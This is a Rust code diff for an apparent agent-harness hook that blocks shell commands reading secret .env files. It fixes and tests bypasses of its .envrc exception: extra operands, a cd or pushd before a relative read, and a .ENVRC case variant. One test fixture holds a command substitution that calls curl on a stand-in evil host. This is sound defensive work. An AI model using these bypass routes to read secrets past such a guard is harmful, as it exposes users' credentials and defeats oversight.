@@ -13,6 +13,7 @@ use crate::secret_patterns::{
 };
 use cadence_hooks_core::shell::{command_segments, split_segments, tokenize};
 use cadence_hooks_core::{Check, CheckResult, HookInput};
+use std::path::Path;
 
 /// Commands that only touch file metadata — they never emit file contents,
 /// so a `.env` operand is safe. `cp`/`mv`/`ln`/`tar` are deliberately NOT
@@ -28,11 +29,14 @@ const METADATA_SAFE_COMMANDS: &[&str] = &[
     "printf", "basename", "dirname", "realpath", "test", "[", "direnv", "git",
 ];
 
-/// If a segment hands a dangerous `.env`-family file to a content-emitting
-/// command, return `(command word, offending token)`.
+/// If a segment hands one or more dangerous `.env`-family files to a
+/// content-emitting command, return every `(command word, offending token)`
+/// pair — NOT just the first (#307: a single-token result let a second
+/// operand in the same segment, e.g. `cat .envrc .env`, slip past the #193
+/// `.envrc` carve-out unexamined).
 ///
 /// The command word is the basename of the segment's first token; segments
-/// whose command word is metadata-safe are skipped. Any later token blocks
+/// whose command word is metadata-safe are skipped. A later token blocks
 /// when it has no internal whitespace AND classifies as dangerous. The
 /// whitespace rule is the false-positive firewall: quoted prose stays glued
 /// into one multi-word token by [`tokenize`] and is skipped, while a quoted
@@ -40,23 +44,26 @@ const METADATA_SAFE_COMMANDS: &[&str] = &[
 /// (`. .env`) and `source .env` fall out of the same rule — neither `.` nor
 /// `source` is metadata-safe — and the old dot-source false positive is now
 /// structural: in `grep . .env`, the `.` is an argument, not a command word.
-fn segment_env_read(segment: &str) -> Option<(String, String)> {
+fn segment_env_reads(segment: &str) -> Vec<(String, String)> {
     let tokens = tokenize(segment);
-    let first = tokens.first()?;
+    let Some(first) = tokens.first() else {
+        return Vec::new();
+    };
     let cmd_word = first.rsplit('/').next().unwrap_or(first);
     // `find` is metadata-safe on its own (`find . -name .env`), but an
     // exec-family action runs a real command on each hit — judge that
     // command instead of exempting the whole `find` (#118).
     if cmd_word == "find" {
-        return find_exec_leak(&tokens);
+        return find_exec_leak(&tokens).into_iter().collect();
     }
     if METADATA_SAFE_COMMANDS.contains(&cmd_word) {
-        return None;
+        return Vec::new();
     }
     tokens[1..]
         .iter()
-        .find(|t| !t.chars().any(char::is_whitespace) && is_dangerous_secret_token(t))
+        .filter(|t| !t.chars().any(char::is_whitespace) && is_dangerous_secret_token(t))
         .map(|t| (cmd_word.to_string(), t.clone()))
+        .collect()
 }
 
 /// `find`'s exec-family flags (`-exec`, `-execdir`, `-ok`, `-okdir`) run their
@@ -97,6 +104,11 @@ fn find_exec_leak(tokens: &[String]) -> Option<(String, String)> {
 /// `foo\;env` yields a spurious nudge (never a block) — accepted.
 fn is_executed_command(lower: &str, cmd: &[&str]) -> bool {
     for segment in split_segments(lower) {
+        // Strip leading subshell/brace-group punctuation so a grouped command
+        // (`(cd /x; …`, `{ cd /x; …`) still surfaces its real command word.
+        // Without this, `(cd` never matches bare `cd` and a grouped directory
+        // change escapes detection — the #193 grouped-cd `.envrc` leak.
+        let segment = segment.trim_start_matches(['(', '{', ' ', '\t']);
         let mut tokens = segment.split_whitespace();
         match cmd {
             [a] if tokens.next() == Some(a) => return true,
@@ -107,8 +119,121 @@ fn is_executed_command(lower: &str, cmd: &[&str]) -> bool {
     false
 }
 
+/// Does the command contain an in-command directory change (`cd`, `pushd`,
+/// `popd`) as the executed command of any segment?
+///
+/// #308: [`envrc_bash_read_allowed`] resolves a RELATIVE `.envrc` operand
+/// against the tool call's static `input.cwd` — but a segment earlier in the
+/// same chain can `cd`/`pushd`/`popd` the shell's real working directory
+/// elsewhere before the read runs. `cd /elsewhere && cat .envrc` would
+/// classify `$cwd/.envrc` (a clean loader at the project root) while the
+/// shell actually reads `/elsewhere/.envrc` (a secret) — the guard proves the
+/// wrong file. Reuses [`is_executed_command`]'s per-segment, quote-aware
+/// executed-command check, so `cd`/`pushd`/`popd` as a path fragment or
+/// argument (`echo cd-something`) doesn't false-positive.
+///
+/// A subshell/brace-grouped `cd` (`(cd /x; cat .envrc)`, `{ cd /x; …`) is
+/// detected too: [`is_executed_command`] strips leading group punctuation
+/// before matching the command word, so grouping cannot hide a directory
+/// change from the carve-out.
+fn command_changes_directory(lower: &str) -> bool {
+    is_executed_command(lower, &["cd"])
+        || is_executed_command(lower, &["pushd"])
+        || is_executed_command(lower, &["popd"])
+}
+
+/// Content-aware `.envrc` carve-out for the Bash read path (#193): the Read/Grep
+/// arms already resolve a pure direnv loader `.envrc` via [`envrc_read_allowed`];
+/// this mirrors that for a `.envrc` operand caught by [`segment_env_reads`].
+///
+/// `resolve_token` is the operand in its ORIGINAL case (see
+/// [`original_case_token_at`]) — needed because the disk path may traverse
+/// mixed-case directories (`/Users/...`, a tempdir), and [`bash_leaks_secrets`]
+/// classifies against a fully-lowercased copy of the command. Only the final
+/// path component is compared against `.envrc` (case-insensitively). A relative
+/// token resolves against `cwd`; an absolute token is used as-is (and is
+/// immune to `command_has_cd` — an absolute path's resolution never depends on
+/// the shell's working directory). Fails CLOSED (returns `false`, keeping the
+/// block) when: the token isn't `.envrc`, the operand is relative AND the
+/// command contains a `cd`/`pushd`/`popd` (#308 — `input.cwd` can no longer be
+/// trusted as the effective read-time cwd), there is no `cwd` to resolve a
+/// relative token against, or the file is unreadable — mirroring
+/// `envrc_read_allowed`'s disk-read fail-closed contract. Only a proven
+/// pure-loader body allows.
+fn envrc_bash_read_allowed(resolve_token: &str, cwd: Option<&str>, command_has_cd: bool) -> bool {
+    let trimmed = resolve_token.strip_prefix('@').unwrap_or(resolve_token);
+    let trimmed = trimmed.trim_end_matches(')');
+    let component = trimmed.rsplit('/').next().unwrap_or(trimmed);
+    if !component.eq_ignore_ascii_case(".envrc") {
+        return false;
+    }
+
+    let path = Path::new(trimmed);
+    let resolved = if path.is_absolute() {
+        path.to_path_buf()
+    } else {
+        if command_has_cd {
+            return false;
+        }
+        match cwd {
+            Some(dir) => Path::new(dir).join(trimmed),
+            None => return false,
+        }
+    };
+
+    envrc_carveout_allows(".envrc", std::fs::read_to_string(&resolved).ok().as_deref())
+}
+
+/// Recover the original-case substring of `command` that a lowercased `token`
+/// (found within `lower`, `command`'s lowercased copy) corresponds to,
+/// searching from `search_from` rather than always the first occurrence.
+///
+/// [`bash_leaks_secrets`] classifies against a fully-lowercased command, but a
+/// disk read must use the real path — a mixed-case directory component
+/// (`/Users/...`, a tempdir) would otherwise fail to resolve on a
+/// case-sensitive filesystem.
+///
+/// The `search_from` cursor is load-bearing on a case-sensitive filesystem
+/// (Linux; not this repo's default macOS APFS, which collapses case
+/// variants): `cat .envrc .ENVRC` are two DISTINCT files there, but both
+/// lowercase to `.envrc` in `lower`. A first-occurrence-always lookup would
+/// recover the LOADER `.envrc` for both operands — reading the loader twice
+/// and clearing the carve-out for the secret `.ENVRC`, which is never
+/// examined. The caller threads a monotonic cursor across every operand in
+/// COMMAND ORDER (see call site), so the Nth lowercased-`.envrc` operand
+/// recovers the Nth actual occurrence.
+///
+/// Returns `None` — the caller MUST treat this as fail-closed (block), never
+/// fall back to the lowercased `token`, since reading it could hit the wrong
+/// file on a case-sensitive filesystem — when: `command` and `lower` diverge
+/// in byte length (non-ASCII lowering breaks the position-preserving
+/// assumption), or `token` cannot be found starting from `search_from`
+/// (including a wrapper-expanded segment whose extracted text doesn't appear
+/// in order — a rare over-block, never a leak). On success, also returns the
+/// cursor (the match's end offset) for the next call.
+fn original_case_token_at(
+    command: &str,
+    lower: &str,
+    token: &str,
+    search_from: usize,
+) -> Option<(String, usize)> {
+    if command.len() != lower.len() {
+        return None;
+    }
+    let haystack = lower.get(search_from..)?;
+    let rel_start = haystack.find(token)?;
+    let start = search_from + rel_start;
+    let end = start + token.len();
+    let original = command.get(start..end)?;
+    Some((original.to_string(), end))
+}
+
 /// Check if a bash command would dump secrets to stdout.
-fn bash_leaks_secrets(command: &str) -> Option<CheckResult> {
+///
+/// `cwd` is the tool call's working directory, used only to resolve a relative
+/// `.envrc` operand for the content-aware carve-out (#193) — no other
+/// classification in this function depends on it.
+fn bash_leaks_secrets(command: &str, cwd: Option<&str>) -> Option<CheckResult> {
     let lower = command.to_lowercase();
 
     // Block: a dangerous deny-set operand (the `.env` family plus the non-`.env`
@@ -116,8 +241,37 @@ fn bash_leaks_secrets(command: &str) -> Option<CheckResult> {
     // (#65, #66, #138). Judged per segment so a chained or `sh -c`-wrapped read
     // is still seen.
     if command_may_reference_secret(&lower) {
+        // #308: computed once per command — an in-command cd/pushd/popd
+        // anywhere invalidates the RELATIVE-operand carve-out for every
+        // segment, since the shell's real cwd at read time can no longer be
+        // trusted to equal `input.cwd`.
+        let command_has_cd = command_changes_directory(&lower);
+        // Threaded across every operand in COMMAND ORDER (see
+        // original_case_token_at): recovers the Nth occurrence of a
+        // lowercased operand as the Nth actual occurrence, so two
+        // case-distinct files that collapse to the same lowercased token
+        // (`.envrc` / `.ENVRC` on a case-sensitive filesystem) resolve to
+        // their own real files rather than both reading the first one.
+        let mut search_from = 0usize;
         for segment in command_segments(&lower) {
-            if let Some((cmd_word, token)) = segment_env_read(&segment) {
+            // #307: a segment can carry MULTIPLE dangerous operands (`cat .envrc
+            // .env`) — the carve-out below only `continue`s past an INDIVIDUAL
+            // proven pure-loader `.envrc`; any other dangerous operand in the
+            // same segment still falls through to the block below, exactly as
+            // it did before the #193 carve-out existed.
+            for (cmd_word, token) in segment_env_reads(&segment) {
+                let allowed = match original_case_token_at(command, &lower, &token, search_from) {
+                    Some((resolve_token, next_cursor)) => {
+                        search_from = next_cursor;
+                        envrc_bash_read_allowed(&resolve_token, cwd, command_has_cd)
+                    }
+                    // Fail closed: recovery couldn't prove which file this
+                    // operand names, so the carve-out must not fire.
+                    None => false,
+                };
+                if allowed {
+                    continue;
+                }
                 return Some(CheckResult::block(format!(
                     "🚫 BLOCKED: prevent-secret-leaks: command would expose secret file contents\n\
                      Found: `{token}` as an operand of `{cmd_word}`\n\
@@ -267,7 +421,7 @@ impl Check for SecretLeaksGuard {
                     return CheckResult::allow();
                 };
 
-                bash_leaks_secrets(command).unwrap_or_else(CheckResult::allow)
+                bash_leaks_secrets(command, input.cwd.as_deref()).unwrap_or_else(CheckResult::allow)
             }
             _ => CheckResult::allow(),
         }
@@ -296,6 +450,7 @@ mod tests {
     }
 
     use cadence_hooks_core::test_builders::make_bash as make_bash_input;
+    use cadence_hooks_core::test_builders::make_bash_with_cwd;
 
     #[test]
     fn read_env_blocked() {
@@ -1528,6 +1683,280 @@ mod tests {
     fn bash_cat_envrc_still_blocked_138() {
         // #149 contract: `.envrc` keeps its Bash name-block.
         let result = SecretLeaksGuard.run(&make_bash_input("cat .envrc"));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    // ---------------------------------------------------------------
+    // #193: content-aware .envrc carve-out on the Bash read path
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn bash_cat_pure_loader_envrc_allowed() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+    }
+
+    #[test]
+    fn bash_cat_secret_envrc_still_blocked() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "export API_KEY=xyz\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_envrc_missing_file_fails_closed() {
+        // cwd is provided but has no `.envrc` on disk — fail closed, still block.
+        let dir = tempfile::tempdir().unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_envrc_metachar_still_blocked() {
+        // A safe-looking directive followed by command substitution is code
+        // execution, not config — `envrc_line_is_safe`'s metachar firewall.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join(".envrc"),
+            "PATH=$(curl https://evil.example)\n",
+        )
+        .unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_absolute_path_pure_loader_envrc_allowed() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join(".envrc");
+        std::fs::write(&path, "use flake\n").unwrap();
+        let command = format!("cat {}", path.to_str().unwrap());
+        let result = SecretLeaksGuard.run(&make_bash_input(&command));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+    }
+
+    // ---------------------------------------------------------------
+    // #307: multi-operand leak through the #193 carve-out. The old
+    // segment_env_read stopped at the FIRST dangerous token; when that token
+    // was a proven pure-loader .envrc, the whole segment was skipped and a
+    // second, non-.envrc secret operand in the same segment was never
+    // examined.
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn bash_cat_loader_envrc_then_secret_sibling_still_blocks() {
+        // The headline exploit: `.envrc` is a proven pure loader, but `.env`
+        // sits right beside it in the same segment and must still block.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".env"), "export API_KEY=xyz\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc .env",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_secret_then_loader_envrc_blocks_control() {
+        // Control: `.env` first in the segment already blocked before #193
+        // and must keep blocking regardless of operand order.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".env"), "export API_KEY=xyz\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .env .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_paste_loader_then_secret_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".env"), "export API_KEY=xyz\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "paste .envrc .env",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_head_loader_then_secret_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".env"), "export API_KEY=xyz\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "head .envrc .env",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_single_pure_loader_envrc_still_allowed() {
+        // Sibling-safe check: a lone pure-loader `.envrc` operand (no other
+        // dangerous operand in the segment) is unaffected by the fix.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+    }
+
+    // ---------------------------------------------------------------
+    // #308: cwd desync via an in-command cd/pushd. The carve-out resolved a
+    // relative `.envrc` operand against the STATIC input.cwd, but never
+    // accounted for the shell having cd'd elsewhere first — so a clean
+    // loader at input.cwd could amnesty a read that the shell actually
+    // pointed at a different (possibly secret) directory.
+    // ---------------------------------------------------------------
+
+    #[test]
+    fn bash_cd_then_cat_relative_envrc_still_blocks() {
+        // input.cwd holds a pure-loader .envrc, but the command cd's
+        // elsewhere before reading the relative `.envrc` operand — the guard
+        // cannot prove which file the shell actually reads, so it must block.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cd /elsewhere && cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_pushd_then_cat_relative_envrc_still_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "pushd /x && cat .envrc",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cd_then_cat_absolute_envrc_allowed() {
+        // An absolute `.envrc` operand resolves independent of the shell's
+        // cwd, so a preceding cd doesn't invalidate it.
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join(".envrc");
+        std::fs::write(&path, "use flake\n").unwrap();
+        let command = format!("cd /elsewhere && cat {}", path.to_str().unwrap());
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(&command, "/elsewhere"));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+    }
+
+    #[test]
+    fn bash_grouped_subshell_cd_then_cat_relative_envrc_still_blocks() {
+        // A subshell-grouped cd glues `(` onto the cd token; the group-strip in
+        // is_executed_command must still surface it so the relative read blocks.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "(cd /elsewhere; cat .envrc)",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_brace_grouped_cd_then_cat_relative_envrc_still_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "{ cd /elsewhere; cat .envrc; }",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    // ---------------------------------------------------------------
+    // Case-sensitive filesystem: `.envrc` and `.ENVRC` are two DISTINCT files
+    // there (Linux; not this repo's default macOS APFS, which collapses case
+    // variants onto one inode). `bash_leaks_secrets` lowercases the whole
+    // command before classifying, so both operands become the lowercased
+    // token `.envrc` — recovering original case at the FIRST occurrence
+    // (the old `original_case_token`) resolved BOTH operands to the loader
+    // file, clearing the carve-out for a secret-bearing `.ENVRC` that was
+    // never actually read. `original_case_token_at`'s monotonic cursor fixes
+    // this by recovering the Nth occurrence for the Nth operand.
+    //
+    // These tests are meaningless on a filesystem that collapses the two
+    // names (macOS APFS default), so they self-skip via a same-tempdir probe
+    // rather than asserting a false pass. On Linux (this crate's CI target
+    // and cadence-hooks' actual runtime) the tempdir IS case-sensitive, so
+    // the test exercises the real fix there.
+    // ---------------------------------------------------------------
+
+    /// True if writing distinct content to `<dir>/.envrc` and `<dir>/.ENVRC`
+    /// produces two independently-readable files — false on a
+    /// case-insensitive filesystem, where the second write clobbers the
+    /// first (same inode under the two names).
+    fn fs_is_case_sensitive(dir: &std::path::Path) -> bool {
+        let lower = dir.join(".envrc");
+        let upper = dir.join(".ENVRC");
+        std::fs::write(&lower, "lower-probe").unwrap();
+        std::fs::write(&upper, "upper-probe").unwrap();
+        std::fs::read_to_string(&lower).ok().as_deref() == Some("lower-probe")
+    }
+
+    #[test]
+    fn bash_cat_loader_then_case_variant_secret_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        if !fs_is_case_sensitive(dir.path()) {
+            eprintln!(
+                "skipping bash_cat_loader_then_case_variant_secret_blocks: \
+                 filesystem collapses .envrc/.ENVRC (case-insensitive)"
+            );
+            return;
+        }
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".ENVRC"), "export API_KEY=hunter2\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc .ENVRC",
+            dir.path().to_str().unwrap(),
+        ));
+        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+    }
+
+    #[test]
+    fn bash_cat_loader_then_case_variant_secret_chain_blocks() {
+        let dir = tempfile::tempdir().unwrap();
+        if !fs_is_case_sensitive(dir.path()) {
+            eprintln!(
+                "skipping bash_cat_loader_then_case_variant_secret_chain_blocks: \
+                 filesystem collapses .envrc/.ENVRC (case-insensitive)"
+            );
+            return;
+        }
+        std::fs::write(dir.path().join(".envrc"), "use flake\n").unwrap();
+        std::fs::write(dir.path().join(".ENVRC"), "export API_KEY=hunter2\n").unwrap();
+        let result = SecretLeaksGuard.run(&make_bash_with_cwd(
+            "cat .envrc && cat .ENVRC",
+            dir.path().to_str().unwrap(),
+        ));
         assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
     }
 }
